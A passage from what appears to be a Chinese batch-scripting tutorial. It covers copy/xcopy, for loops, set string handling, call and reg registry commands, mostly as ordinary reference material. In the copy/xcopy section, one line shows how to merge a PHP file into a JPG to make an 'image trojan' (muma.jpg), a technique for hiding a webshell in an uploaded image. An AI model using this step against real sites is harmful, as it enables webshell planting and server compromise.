设置属性。  -    清除属性。  R   只读文件属性。  A   存档文件属性。  S   系统文件属性。  H   隐藏文件属性。  [drive:][path][filename]      指定要处理的文件属性。  /S  处理当前文件夹及其子文件夹中的匹配文件。  /D  也处理文件夹。</code></pre><p>例：</p><pre><code class="hljs">md autorunattrib +a +s +h autorun</code></pre><p>上面的命令将建立文件夹autorun，然后将其设为存档、系统、隐藏属性</p><p>29.eof (end of file)</p><p>1、在无call的情况下，会直接退出批处理，此时等同于exit<br>2、在call的情况下，会中止call，继续执行其他命令</p><p>示例：</p><pre><code class="hljs">    @echo off    call :str1    pause    goto :eof    echo 此行代码不会被运行        :str1    echo 此行代码运行    goto :eof    </code></pre><p><strong>30.copy 和 xcopy</strong> </p><p>话不多说，先丢使用帮助</p><p><strong>COPY</strong><br>    将一份或多份文件复制到另一个位置。</p><pre><code class="hljs">COPY [/D] [/V] [/N] [/Y | /-Y] [/Z] [/L] [/A | /B ] source [/A | /B]     [+ source [/A | /B] [+ ...]] [destination [/A | /B]]   source       指定要复制的文件。  /A           表示一个 ASCII 文本文件。  /B           表示一个二进位文件。  /D           允许解密要创建的目标文件  destination  为新文件指定目录和/或文件名。  /V           验证新文件写入是否正确。  /N           复制带有非 8dot3 名称的文件时，               尽可能使用短文件名。  /Y           不使用确认是否要覆盖现有目标文件               的提示。  /-Y          使用确认是否要覆盖现有目标文件               的提示。  /Z           用可重新启动模式复制已联网的文件。/L           如果源是符号链接，请将链接复制               到目标而不是源链接指向的实际文件。 命令行开关 /Y 可以在 COPYCMD 环境变量中预先设定。这可能会被命令行上的 /-Y 替代。除非 COPY命令是在一个批处理脚本中执行的，默认值应为在覆盖时进行提示。 要附加文件，请为目标指定一个文件，为源指定数个文件(用通配符或 file1+file2+file3 格式)。</code></pre><p><strong>XCOPY</strong></p><pre><code class="hljs">复制文件和目录树。 XCOPY source [destination] [/A | /M] [/D[:date]] [/P] [/S [/E]] [/V] [/W]                           [/C] [/I] [/Q] [/F] [/L] [/G] [/H] [/R] [/T] [/                           [/K] [/N] [/O] [/X] [/Y] [/-Y] [/Z] [/B]                           [/EXCLUDE:file1[+file2][+file3]...]   source       指定要复制的文件。  destination  指定新文件的位置和/或名称。  /A           仅复制有存档属性集的文件，但不更改属性。  /M           仅复制有存档属性集的文件，并关闭存档属性。  /D:m-d-y     复制在指定日期或指定日期以后更改的文件。               如果没有提供日期，只复制那些源时间比目标时间新的文件。  /EXCLUDE:file1[+file2][+file3]...               指定含有字符串的文件列表。每个字符串在文件中应位于单独的一行               如果任何字符串与复制文件的绝对路径的任何部分相符，则排除复制               该文件。例如，指定如 \obj\ 或 .obj 的字符串会分别排除目录               obj 下面的所有文件或带有 .obj 扩展名的所有文件。  /P           创建每个目标文件之前提示您。  /S           复制目录和子目录，不包括空目录。  /E           复制目录和子目录，包括空目录。与 /S /E 相同。可以用来修改 /  /V           验证每个新文件的大小。  /W           提示您在复制前按键。  /C           即使有错误，也继续复制。  /I           如果目标不存在，且要复制多个文件，则假定目标必须是目录。  /Q           复制时不显示文件名。  /F           复制时显示完整的源文件名和目标文件名。  /L           显示要复制的文件。  /G           允许将加密文件复制到不支持加密的目标。  /H           也复制隐藏文件和系统文件。  /R           覆盖只读文件。  /T           创建目录结构，但不复制文件。不包括空目录或子目录。/T /E 包括               空目录和子目录。  /U           只复制已经存在于目标中的文件。  /K           复制属性。一般的 Xcopy 会重设只读属性。  /N           用生成的短名称复制。  /O           复制文件所有权和 ACL 信息。  /X           复制文件审核设置(隐含 /O)。  /Y           取消提示以确认要覆盖现有目标文件。  /-Y          要提示以确认要覆盖现有目标文件。  /Z           在可重新启动模式下复制网络文件。  /B           复制符号链接本身与链接目标相对。  /J           复制时不使用缓冲的 I/O。推荐复制大文件时使用。 开关 /Y 可以预先在 COPYCMD 环境变量中设置。这可能被命令行上的 /-Y 覆盖。</code></pre><p>乍一看两者都是复制文件，但是使用上有着很大的区别</p><p><strong>（1）区别一：COPY不能复制文件夹下的文件，而XCOPY可以</strong><br>假设：有这样的文件结构：C盘下有2个文件夹，为A和B，在A下有1个文件和1个文件夹，现在要将A文件夹下的所有内容拷贝到B文件夹下，我们可以使用XCOPY实现</p><pre><code class="hljs">C:\&gt;XCOPY A:\A\*.* C:\B /S /E</code></pre><p><strong>（1）区别二：XCOPY 不能实现文件的拼接，但是COPY可以</strong></p><p>典型的将图片和文本结合（图片马的生成）</p><p>OPY 1.JPG&#x2F;b + 1.php&#x2F;a muma.jpg</p><p>31.重命名 ren </p><pre><code class="hljs">ren 原路径\文件名.扩展名 新文件名.扩展名</code></pre><p>32.获取帮助 &#x2F;?</p><p>命令 &#x2F;? 获取帮助</p><h3 id="中阶"><a href="#中阶" class="headerlink" title="中阶"></a><strong>中阶</strong></h3><h4 id="10-if-条件语句："><a href="#10-if-条件语句：" class="headerlink" title="10.if 条件语句："></a><strong>10.if 条件语句：</strong></h4><p>（1） if [not] “参数” &#x3D;&#x3D; “字符串” 待执行的命令<br>（2） if [not] exist [路径]文件名 待执行的命令<br>（3） if errorlevel&lt;数字&gt; 待执行的命令</p><h4 id="11-goto-跳转指令"><a href="#11-goto-跳转指令" class="headerlink" title="11.goto 跳转指令"></a><strong>11.goto 跳转指令</strong></h4><p>执行到goto就跳转到goto后面指定的标号的位置（标号用:+字符串组成）标号所在的行不被执行（常和if语句配合使用）</p><pre><code class="hljs">goto end :end echo this is the end </code></pre><h4 id="12-choice"><a href="#12-choice" class="headerlink" title="12.choice"></a><strong>12.choice</strong></h4><p>用户输入预先设定好的字符之一，返回字符对应的level 可以配合 errorlevel 实现选择功能</p><pre><code class="hljs">示例:   CHOICE /?   CHOICE /C YNC /M &quot;确认请按 Y，否请按 N，或者取消请按 C。&quot;   CHOICE /T 10 /C ync /CS /D y   CHOICE /C ab /M &quot;选项 1 请选择 a，选项 2 请选择 b。&quot;   CHOICE /C ab /N /M &quot;选项 1 请选择 a，选项 2 请选择 b。&quot;</code></pre><p>比如我输入：CHOICE &#x2F;C YNC &#x2F;M “确认请按 Y，否请按 N，或者取消请按 C”<br>就会返回：确认请按 Y，否请按 N，或者取消请按 C [Y,N,C]?</p><pre><code class="hljs">choice /C SME /M &quot;start middle end&quot;if errorlevel 3 goto endif errorlevel 2 goto middleif errorlevel 1 goto start:start echo start goto end:middleecho middlegoto end:end echo good bye</code></pre><h4 id="13-for-循环命令"><a href="#13-for-循环命令" class="headerlink" title="13.for 循环命令"></a><strong>13.for 循环命令</strong></h4><p>for &#x2F;参数 %%变量 in (集合) do 命令</p><p><strong>注意：</strong></p><p>（1）%% 是在bat 文件中的写法，如果是在命令行里面的话只需要有一个%，并且<strong>变量名区分大小写</strong></p><p>（2）in 和 () 之间是有空格的</p><p>（3）括号中的内容可以是文件、字符串甚至是命令产生的集合（可以使用通配符*?,还能引用环境变量）</p><p>（4）命令可以是任何合法的DOS命令，或者是外部可以调用的程序，可以使用括号把多条命令括起来打包执行</p><p>参数：<br>1.&#x2F;d 表示只对目录而不是文件执行for命令 <strong>（只对目录）</strong></p><pre><code class="hljs">for /d %%a in (c:\*) do @echo %%a </code></pre><p>2.&#x2F;r <strong>递归</strong></p><p>后面可以跟路径信息（指的是包含它之下的整个目录树，如果是一个.或者省略指的就是当前目录），表示后面的循环指令对每个目录都生效（大概意思就是我这个操作是和这个盘关联的，先指定一个范围）</p><p>实例一：</p><pre><code class="hljs">for /r . %%a in (abc.txt) do @echo . &gt; %%a //在当前目录下的每一个目录中创建一个abc.txt 空文件</code></pre><p>实例二：</p><pre><code class="hljs">@echo offrem 显示d:盘中所有文件名为file1和file2的列表for /r d:\ %%h in (file1,file2) do if exist %%h echo %%hpause</code></pre><p>实例三：</p><pre><code class="hljs">@echo offrem 删除C盘中所有*.chk的文件for /r c:\ %%h in (*.chk) do del /q %%hpause</code></pre><p>3.&#x2F;L (该集表示以增量形式从开始到结束的一个数字序列。可以使用负的 Step)<strong>–》迭代数值范围</strong></p><pre><code class="hljs">for /L %%变量 in (起始值，每次增值，结束时的比较值) do 命令</code></pre><p>其实就是产生一个等差数列，方便执行命令的时候使用这些数字</p><p>实例：</p><pre><code class="hljs">    for /l %%i in (1,1,5) do @echo %%i --输出1 2 3 4 5　　for /l %%i in (1,2,10) do @echo %%i --输出1,3，5,7，9　　for /l %%i in (100,-20,1) do @echo %%i --输出100,80,60,40,20　　for /l %%i in (1,1,5) do start cmd --打开5个CMD窗口　　for /l %%i in (1,1,5) do md %%i --建立从1~5共5个文件夹　　for /l %%i in (1,1,5) do rd /q %%i --删除从1~5共5个文件夹</code></pre><p>4.&#x2F;f<br>这个可能是最常用的，也是最强的命令，主要用来处理文件和一些命令的输出结果</p><pre><code class="hljs">FOR /F [&quot;options&quot;] %%i IN (file) DO commandFOR /F [&quot;options&quot;] %%i IN (&quot;string&quot;) DO commandFOR /F [&quot;options&quot;] %%i IN (command) DO command</code></pre><p>对于</p><pre><code class="hljs">FOR /F %%i IN (file) DO command</code></pre><p>file为文件名，按照官方的说法是，for会依次将file中的文件打开，并且在进行到下一个文件之前将每个文件读取到内存，按照每一行分成一个一个的元素，忽略空白的行，看个例子。 </p><p>假如文件a.txt中有如下内容：</p><pre><code class="hljs">第1行第1列第1行第2列 第1行第3列第2行第1列 第2行第2列 第2行第3列第3行第1列 第3行第2列 第3行第3列</code></pre><p>你想显示a.txt中的内容，会用什么命令呢？当然是type，type a.txt</p><p>for也可以完成同样的命令：</p><pre><code class="hljs">for /f %%i in (a.txt) do echo %%i</code></pre><p>还是先从括号执行，因为含有参数&#x2F;f,所以for会先打开a.txt，然后读出a.txt里面的所有内容，把它作为一个集合，并且以每一行作为一个元素，所以会产生这样的集合，</p><pre><code class="hljs">&#123;&quot;第1行第1列 第1行第2列 第1行第3列&quot;， //第一个元素&quot;第2行第1列 第2行第2列 第2行第3列&quot;， //第二个元素&quot;第3行第1列 第3行第2列 第3行第3列&quot;&#125;   //第三个元素</code></pre><p>集合中只有3个元素，同样用%%i依次代替每个元素，然后执行do后面的命令。</p><p>们发现for &#x2F;f会默认以每一行来作为一个元素，但是如果我们还想把每一行再分解更小的内容，该怎么办呢？不用担心，for命令还为我们提供了更详细的参数，使我们将每一行分为更小的元素成为可能。<br>它们就是：delims和tokens</p><p>delims 用来告诉for每一行应该拿什么作为分隔符，默认的分隔符是空格和tab键<br>比如，还是上面的文件，我们执行下面的命令：</p><pre><code class="hljs">for /f &quot;delims= &quot; %%i in (a.txt) do echo %%i显示的结果是：第1行第1列第2行第1列第3行第1列</code></pre><p>为什么是这样的呢。因为这里有了delims这个参数，&#x3D;后面有一个空格，意思是再将每个元素以空格分割，默认是只取分割之后的第一个元素。</p><p>执行过程是：</p><p>将第一个元素”第1行第1列 第1行第2列 第1行第3列”分成三个元素：”第1行第1列” “第1行第2列” “第1行第3列”，它默认只取第一个，即”第1行第1列”，然后执行do后面的命令，依次类推。</p><p>但是这样还是有局限的，如果我们想要每一行的第二列元素，那又如何呢？</p><p>这时候，tokens跳出来说，我能做到。</p><p>它的作用就是当你通过delims将每一行分为更小的元素时，由它来控制要取哪一个或哪几个。</p><p>还是上面的例子，执行如下命令：</p><pre><code class="hljs">for /f &quot;tokens=2 delims= &quot; %%i in (a.txt) do echo %%i执行结果：第1行第2列第2行第2列第3行第2列</code></pre><p>如果要显示第三列，那就换成tokens&#x3D;3。<br>同时tokens支持通配符*，以及限定范围。<br>如果要显示第二列和第三列，则换成tokens&#x3D;2,3或tokens&#x3D;2-3,如果还有更多的则为：tokens&#x3D;2-10之类的。</p><p>此时的命令为：</p><pre><code class="hljs">for /f &quot;tokens=2,3 delims= &quot; %%i in (a.txt) do echo %%i %%j</code></pre><p>怎么多出一个%%j？</p><p>这是因为你的tokens后面要取每一行的两列，用%%i来替换第二列，用%%j来替换第三列。<br>并且必须是按照英文字母顺序排列的，%%j不能换成%%k，因为i后面是j</p><pre><code class="hljs">执行结果为：第1行第2列第1行第3列第2行第2列 第2行第3列第3行第2列 第3行第3列</code></pre><p>对以通配符*，就是把这一行全部或者这一行的剩余部分当作一个元素了。</p><p>比如：</p><pre><code class="hljs">for /f &quot;tokens=* delims= &quot; %%i in (a.txt) do echo %%i执行结果为：第1行第1列第1行第2列 第1行第3列第2行第1列 第2行第2列 第2行第3列第3行第1列 第3行第2列 第3行第3列</code></pre><p>其实就跟for &#x2F;f %%i in (a.txt) do echo %%i的执行结果是一样的。</p><p>再如：</p><pre><code class="hljs">for /f &quot;tokens=2,* delims= &quot; %%i in (a.txt) do echo %%i %%j执行结果为：第1行第2列第1行第3列第2行第2列 第2行第3列第3行第2列 第3行第3列</code></pre><p>用%%i代替第二列，用%%j代替剩余的所有</p><p>最后还有skip合eol，这俩个简单，skip就是要忽略文件的前多少行，而eol用来指定当一行以什么符号开始时，就忽略它。<br>比如：</p><p>for &#x2F;f “skip&#x3D;2 tokens&#x3D;*” %%i in (a.txt)</p><p>####<strong>14.set</strong></p><p>(1)显示系统环境变量</p><pre><code class="hljs">@echo offset @pause</code></pre><p>(2)直接在bat脚本中设置变量（后面引用的时候要用%变量名%的形式）<br>    <strong>注意：&#x3D; 两边不能有空格</strong></p><pre><code class="hljs">@set var=123@echo %var% @pause</code></pre><p>(3)接受界面参数然后传递给变量 SET &#x2F;P variable&#x3D;[promptString] 接受界面参数</p><pre><code class="hljs">@set /p name=请输入姓名：@echo 你的名字为：%name%@pause</code></pre><p>(4)接受表达式传参 SET &#x2F;A expression </p><pre><code class="hljs">@set /a b=1+1@echo %b%@pause</code></pre><p>(5)截取字符串 %Var:~start,len%</p><p>1.第一种情况：<br>%var:~正数%<br>这种情况是截取从这个长度开始一直到最后的所有字符</p><pre><code class="hljs">@set f=www.baidu.com@set j=%f:~4%@echo %j%@pause </code></pre><p>结果：baidu.com</p><p>2.第二种情况：<br>%var:~负数%<br>这种情况截取从后面数的这个数字绝对值长度的字符串</p><pre><code class="hljs">@set f=www.baidu.com@set j=%f:~-4%@echo %j%@pause </code></pre><p>结果:.com</p><p>3.第三种情况<br>%var:~正数（开始位置，从0开始）,正数（长度或者是该下标的前一个）%<br>这种情况是从某一个位置开始到另一个位置结束</p><pre><code class="hljs">@set f=www.baidu.com@set j=%f:~0,4%@echo %j%@pause </code></pre><p>结果:www.</p><p>4.第四种情况<br>%var:~正数,负数%<br>这种情况是从这个正数的位置开始（最开始是0），到从后面数这个负数的绝对值个数的前一个</p><pre><code class="hljs">@set f=www.baidu.com@set j=%f:~4,-4%@echo %j%@pause </code></pre><p>结果:baidu</p><p>(6)替换字符串</p><pre><code class="hljs">@set f=www.baidu.com@set j=%f:www=bbs%@echo %j%@pause </code></pre><p>结果: bbs.baidu.com</p><h4 id="14-字符串操作"><a href="#14-字符串操作" class="headerlink" title="14.字符串操作"></a><strong>14.字符串操作</strong></h4><p>除了上面讲的使用set以外我们还有其他的字符串操作</p><h5 id="1-扩充显示"><a href="#1-扩充显示" class="headerlink" title="1.扩充显示"></a><strong>1.扩充显示</strong></h5><pre><code class="hljs">~I - 删除任何引号(&quot;)，扩充 %I%~fI - 将 %I 扩充到一个完全合格的路径名%~dI - 仅将 %I 扩充到一个驱动器号%~pI - 仅将 %I 扩充到一个路径%~nI - 仅将 %I 扩充到一个文件名%~xI - 仅将 %I 扩充到一个文件扩展名%~sI - 扩充的路径只含有短名%~aI - 将 %I 扩充到文件的文件属性%~tI - 将 %I 扩充到文件的日期/时间%~zI - 将 %I 扩充到文件的大小`%~$PATH`:I - 查找列在路径环境变量的目录，并将 %I 扩充到找到的第一个完全合格的名称。如果环境变量名未被定义，或者没有找到文件，此组合键会扩充到空字符串可以组合修饰符来得到多重结果:**%~dpI - 仅将 %I 扩充到一个驱动器号和路径%~nxI - 仅将 %I 扩充到一个文件名和扩展名%~fsI - 仅将 %I 扩充到一个带有短名的完整路径名%~dp$PATH:i - 查找列在路径环境变量的目录，并将 %I 扩充到找到的第一个驱动器号和路径。%~ftzaI - 将 %I 扩充到类似输出线路的 DIR**</code></pre><p>说明：这里的%I指的是一个变量，但是不是所有的变量都能够进行扩充的，有两个条件：</p><p>1、该字符串代表一个文件路径；</p><p>2、变量要用%x来表示，x可取a-z A-Z 0-9共62个字符中的任意一个。<br>以%0举例说明：</p><pre><code class="hljs">@echo offecho 正在运行的这个批处理：echo 完全路径：%0echo 去掉引号：%~0echo 所在分区：%~d0echo 所处路径：%~p0echo 文件名：%~n0echo 扩展名：%~x0echo 文件属性：%~a0echo 修改时间：%~t0echo 文件大小：%~z0pause</code></pre><h5 id="2-字符串拷贝"><a href="#2-字符串拷贝" class="headerlink" title="2.字符串拷贝"></a><strong>2.字符串拷贝</strong></h5><pre><code class="hljs">@echo offset str1=This is old stringset str2=This is new stringecho str1=%str1%echo str2=%str2%set str1=%str2%echo %str1%------------%str2%@pause</code></pre><p>结果：</p><p>str1&#x3D;This is old string<br>str2&#x3D;This is new string<br>This is new string————This is new string</p><h5 id="4-变量延迟扩展"><a href="#4-变量延迟扩展" class="headerlink" title="4.变量延迟扩展"></a><strong>4.变量延迟扩展</strong></h5><p>先来看一段代码：</p><pre><code class="hljs">set str=test if %str%==test (    set str=another test    echo %str%)</code></pre><p>输出结果是 test 而不是 another test 这是为什么呢？，以为程序会把这个复合语句看成是一条语句同时操作，变量一开始就被赋值成了test ，等价于下面这样。</p><pre><code class="hljs">set str=test if %str%==test (    set str=another test    echo test    ::注意这里)</code></pre><p>这个时候为了解决这个问题出现了变量延迟扩展（符合语句不一下赋值而是一句一句执行），形式就是声明一个变量延迟扩展开启，然后将需要延迟的变量变成两个感叹号包围</p><pre><code class="hljs">@echo offsetlocal enabledelayedexpansion    ::注意这里 set str=test if %str%==test (    set str=another test    echo !str!      ::注意这里    echo %str%  ::区别</code></pre><h5 id="5-计算字符串长度"><a href="#5-计算字符串长度" class="headerlink" title="5.计算字符串长度"></a><strong>5.计算字符串长度</strong></h5><pre><code class="hljs">@echo offset str1=This is a test stringset str=%str1%:next1if not &quot;%str%&quot;==&quot;&quot; (set /a num+=1set &quot;str=%str:~1%&quot;goto next1)echo str1=%str1%echo str1的长度为：%num%</code></pre><h5 id="6-寻找一个字符串中某个字符第一次出现的位置"><a href="#6-寻找一个字符串中某个字符第一次出现的位置" class="headerlink" title="6.寻找一个字符串中某个字符第一次出现的位置"></a><strong>6.寻找一个字符串中某个字符第一次出现的位置</strong></h5><pre><code class="hljs">@echo offSetlocal ENABLEDELAYEDEXPANSIONset str1=This is a test stringset ch1=tset str=%str1%:nextif not &quot;%str%&quot;==&quot;&quot; (set /a num+=1if &quot;!str:~0,1!&quot;==&quot;%ch1%&quot; goto lastset &quot;str=%str:~1%&quot;goto next)set /a num=0:lastecho 字符&#39;%ch1%&#39;在字符串&quot;%str1%&quot;中的首次出现位置为%num%</code></pre><p><strong>14.call指定调用</strong></p><p>(1)指定调用bat脚本</p><p>新建一个call1.bat 内容如下</p><pre><code class="hljs">@echo running call1</code></pre><p>新建一个call2.bat 内容如下</p><p>@call call1.bat<br>@echo running call2.bat</p><p>结果:<br>running call1<br>running call2</p><p>(2)指定调用标签(和goto比较一下)</p><p>call3bat</p><pre><code class="hljs">@echo offcall :labelecho 1echo 2 :labelecho 3echo 4</code></pre><p>call4.bat</p><pre><code class="hljs">@echo offcall call3.batpause</code></pre><hr><p>call5.bat</p><pre><code class="hljs">@echo offgoto labelecho 1echo 2 :labelecho 3echo 4</code></pre><p>call6.bat</p><pre><code class="hljs">@echo offcall call5.batpause</code></pre><p>(3)传参数</p><p>a.bat内容：</p><pre><code class="hljs">@echo offecho %0 %1goto :eof</code></pre><p>b.bat内容：</p><pre><code class="hljs">@echo offcall a.bat hellodir c:\pause</code></pre><h4 id="15-产生随机数"><a href="#15-产生随机数" class="headerlink" title="15.产生随机数"></a><strong>15.产生随机数</strong></h4><p>(1)生成0-65535随机数：</p><pre><code class="hljs">@echo %random%</code></pre><p>(2)生成指定范围的随机数(利用模运算)</p><p>产生一个255以内的数</p><pre><code class="hljs">@echo off setlocal enabledelayedexpansion set /a h1=%random%%%(255+1) echo %h1% pause </code></pre><h4 id="16-延时"><a href="#16-延时" class="headerlink" title="16.延时"></a><strong>16.延时</strong></h4><p>bat 脚本往往采用 ping 命令指定发包数实现延时</p><p>延时两秒：</p><pre><code class="hljs">@ping 127.0.0.1 -n 3 &gt;nul </code></pre><h4 id="17-正则匹配"><a href="#17-正则匹配" class="headerlink" title="17.正则匹配"></a><strong>17.正则匹配</strong></h4><p><strong>findstr</strong> 个人认为不够强大，还是推荐shell脚本</p><pre><code class="hljs">FINDSTR [/B] [/E] [/L] [/R] [/S] [/I] [/X] [/V] [/N] [/M] [/O] [/P] [/F:file][/C:string] [/G:file] [/D:dir list] [/A:color attributes] [/OFF[LINE]]strings [[drive:][path]filename[ ...]]/B 在一行的开始配对模式。/E 在一行的结尾配对模式。/L 按字使用搜索字符串。/R 将搜索字符串作为正则表达式使用。/S 在当前目录和所有子目录中搜索匹配文件。/I 指定搜索不分大小写。/X 打印完全匹配的行。/V 只打印不包含匹配的行。/N 在匹配的每行前打印行数。/M 如果文件含有匹配项，只打印其文件名。/O 在每个匹配行前打印字符偏移量。/P 忽略有不可打印字符的文件。/OFF[LINE] 不跳过带有脱机属性集的文件。/A:attr 指定有十六进位数字的颜色属性。请见 &quot;color /?&quot;/F:file 从指定文件读文件列表 (/ 代表控制台)。/C:string 使用指定字符串作为文字搜索字符串。/G:file 从指定的文件获得搜索字符串。 (/ 代表控制台)。/D:dir 查找以分号为分隔符的目录列表strings 要查找的文字。[drive:][path]filename指定要查找的文件。除非参数有 /C 前缀，请使用空格隔开搜索字符串。例如: &#39;FINDSTR &quot;hello there&quot; x.y&#39; 在文件 x.y 中寻找 &quot;hello&quot; 或&quot;there&quot;。&#39;FINDSTR /C:&quot;hello there&quot; x.y&#39; 文件 x.y 寻找&quot;hello there&quot;。正则表达式的快速参考:. 通配符: 任何字符* 重复: 以前字符或类出现零或零以上次数^ 行位置: 行的开始$ 行位置: 行的终点[class] 字符类: 任何在字符集中的字符[^class] 补字符类: 任何不在字符集中的字符[x-y] 范围: 在指定范围内的任何字符\x Escape: 元字符 x 的文字用法\&lt;xyz 字位置: 字的开始xyz\&gt; 字位置: 字的结束 </code></pre><h2 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h2><h3 id="1-注册表操作"><a href="#1-注册表操作" class="headerlink" title="1.注册表操作"></a><strong>1.注册表操作</strong></h3><p>reg 是专门用来修改注册表的命令</p><h4 id="1-reg-add-将新的子项或者项添加到注册表中"><a href="#1-reg-add-将新的子项或者项添加到注册表中" class="headerlink" title="1.reg add 将新的子项或者项添加到注册表中"></a><strong>1.reg add 将新的子项或者项添加到注册表中</strong></h4><p>reg add KeyName [&#x2F;v EntryName|&#x2F;ve][&#x2F;tDataType][&#x2F;s separator][&#x2F;d value][&#x2F;f]</p><p><strong>参数解释：</strong></p><p><strong>1.KeyName 指定项的完全路径</strong><br>对于远程计算机，请在\ComputerName\PathToSubkey中的子项路径前包含计算机名称。忽略ComputerName会导致默认对本地计算机进行操作。以相应的子目录树开始路径。有效子目录树为HKLM、HKCU、HKCR、HKU以及HKCC。远程机器上只有 HKLM 和 HKU</p><p><strong>常见的缩写以及全称：</strong></p><pre><code class="hljs">HKCR： HKEY_CLASSES_ROOTHKCU： HKEY_CURRENT_USERHKLM： HKEY_LOCAL_MACHINEHKU： HKEY_USERSHKCC： HKEY_CURRENT_CONFIG </code></pre><p>&#x2F;v EntryName 你添加的项的名字<br>&#x2F;ve 指定名称为空值<br>&#x2F;t DataType 指定想的数据类型 </p><p><strong>常见的类型：</strong></p><pre><code class="hljs">REG_SZREG_MULTI_SZREG_DWORD_BIG_ENDIANREG_DWORDREG_BINARYREG_DWORD_LITTLE_ENDIANREG_LINKREG_FULL_RESOURCE_DESCRIPTORREG_EXPAND_SZ </code></pre><p>&#x2F;s  指定分隔符，不自定默认为 \0<br>&#x2F;d  指定值<br>&#x2F;f  取消质询</p><p><strong>实例：</strong><br>1.显示隐藏的文件和文件夹</p><pre><code class="hljs">cmd /k reg add &quot;HKLM\Software\Microsoft\Windows\CurrentVersion\explorer\Advanced\Folder\Hidden\SHOWALL&quot; /v Checkedvalue /t reg_dword /d 1 /f</code></pre><p>2.开机启动输入法程序CTFMON</p><pre><code class="hljs">　cmd /k reg add &quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v ctfmon.exe /t REG_SZ /d &quot;%SystemRoot%\system32\ctfmon.exe&quot; /f</code></pre><p>3.添加远程机器 ABC 上的一个注册表项 HKLM\Software\MyCo</p><p>REG ADD \ABC\HKLM\Software\MyCo</p><h4 id="2-reg-delete-从注册表删除项或子项"><a href="#2-reg-delete-从注册表删除项或子项" class="headerlink" title="2.reg delete 从注册表删除项或子项"></a><strong>2.reg delete 从注册表删除项或子项</strong></h4><pre><code class="hljs">reg delete KeyName [&#123;/v EntryName|/ve|/va&#125;] [/f] </code></pre><p><strong>参数解释：</strong></p><p>&#x2F;va<br>　　删除指定子项下的所有项。使用本参数不能删除指定子项下的子项。 </p><p><strong>实例：</strong></p><p>1.删除CTFMON的镜像劫持</p><pre><code class="hljs">cmd /k reg delete &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ctfmon.exe&quot; /f</code></pre><h4 id="3-reg-compare-比较指定的注册表子项或项"><a href="#3-reg-compare-比较指定的注册表子项或项" class="headerlink" title="3.reg compare 比较指定的注册表子项或项"></a><strong>3.reg compare 比较指定的注册表子项或项</strong></h4><p>reg compare KeyName1 KeyName2 [&#x2F;v EntryName | &#x2F;ve] {[&#x2F;oa]|[&#x2F;od]|[&#x2F;os]|[on]} [&#x2F;s] </p><p><strong>参数解释：</strong></p><pre><code class="hljs">/ve 指定只可以比较没有值的项。　　&#123;[/oa]|[/od]|[/os]|[on]&#125;　　指定不同点和匹配点的显示方式。默认设置是/od。　　值说明　　/oa指定显示所有不同点和匹配点。默认情况下，仅列出不同点。　　/od指定仅显示不同点。这是默认操作。　　/os指定仅显示匹配点。默认情况下，仅列出不同点。　　/on指定不显示任何内容。默认情况下，仅列出不同点。　　/s Separator　　比较所有子项和项。 </code></pre><p><strong>实例:</strong></p><pre><code class="hljs">reg compare &quot;hkcu\software\microsoft\winmine&quot; &quot;hkcu\software\microsoft\winmine&quot; /od /s </code></pre><h4 id="4-reg-copy-将一个注册表项复制到本地或远程计算机的指定位置"><a href="#4-reg-copy-将一个注册表项复制到本地或远程计算机的指定位置" class="headerlink" title="4.reg copy 将一个注册表项复制到本地或远程计算机的指定位置"></a><strong>4.reg copy 将一个注册表项复制到本地或远程计算机的指定位置</strong></h4><pre><code class="hljs">reg copy KeyName1 KeyName2 [/s] [/f] </code></pre><p><strong>参数解释：</strong></p><p>&#x2F;s 复制指定子项下的所有子项和项。 </p><p>实例：</p><pre><code class="hljs">reg copy &quot;hkcu\software\microsoft\winmine&quot; &quot;hkcu\software\microsoft\winminebk&quot; /s /f　　reg copy &quot;hkcu\software\microsoft\winminebk&quot; &quot;hkcu\software\microsoft\winmine&quot; /s</code></pre><h4 id="5-reg-export-将指定子项、项和值的副本创建到文件中，以便将其传输到其它服务器"><a href="#5-reg-export-将指定子项、项和值的副本创建到文件中，以便将其传输到其它服务器" class="headerlink" title="5.reg export 将指定子项、项和值的副本创建到文件中，以便将其传输到其它服务器"></a><strong>5.reg export 将指定子项、项和值的副本创建到文件中，以便将其传输到其它服务器</strong></h4><pre><code class="hljs">reg export KeyName FileName </code></pre><p><strong>参数解释：</strong></p><pre><code class="hljs">FileName 指定要导出文件的名称和路径。该文件必须具有.reg扩展名。 </code></pre><p><strong>实例：</strong></p><pre><code class="hljs">reg export &quot;hkcu\software\microsoft\winmine&quot; c:\data\regbackups\wmbkup.reg </code></pre><h4 id="6-reg-import-将包含导出的注册表子项、项和值的文件复制到本地计算机的注册表中"><a href="#6-reg-import-将包含导出的注册表子项、项和值的文件复制到本地计算机的注册表中" class="headerlink" title="6.reg import 将包含导出的注册表子项、项和值的文件复制到本地计算机的注册表中"></a><strong>6.reg import 将包含导出的注册表子项、项和值的文件复制到本地计算机的注册表中</strong></h4><pre><code class="hljs">reg import FileName </code></pre><p><strong>参数解释：</strong></p><pre><code class="hljs">　FileName　指定将复制到本地计算机注册表中的文件的名称和路径。必须预先使用reg export命令创建该文件。</code></pre><p><strong>实例：</strong></p><pre><code class="hljs">reg import hkcu\software\microsoft\winmine&quot; c:\data\regbackups\wmbkup.reg </code></pre><h4 id="7-reg-load-将保存的子项和项写回到注册表的不同子项中"><a href="#7-reg-load-将保存的子项和项写回到注册表的不同子项中" class="headerlink" title="7.reg load 将保存的子项和项写回到注册表的不同子项中"></a><strong>7.reg load 将保存的子项和项写回到注册表的不同子项中</strong></h4><p>其目的是保存到一个临时文件中，而该文件可用于注册表项的疑难解答或编辑注册表项。</p><pre><code class="hljs">reg load KeyName FileName </code></pre><p><strong>参数解释：</strong></p><p>　&#x2F;s 将返回各个层中的所有子项和项。如果不使用该参数，将只返回下一层的子项和项。 </p><h4 id="8-reg-query-返回注册表的子项下的项和下一层子项的列表"><a href="#8-reg-query-返回注册表的子项下的项和下一层子项的列表" class="headerlink" title="8.reg query 返回注册表的子项下的项和下一层子项的列表"></a><strong>8.reg query 返回注册表的子项下的项和下一层子项的列表</strong></h4><pre><code class="hljs">reg query KeyName [&#123;/v EntryName|/ve&#125;] [/s] </code></pre><p><strong>参数解释：</strong></p><pre><code class="hljs">/s将返回各个层中的所有子项和项。如果不使用该参数，将只返回下一层的子项和项。 </code></pre><p><strong>实例：</strong></p><pre><code class="hljs">reg query &quot;hklm\system\currentcontrolset\control\session manager&quot; /v maxstacktracedepthreg query 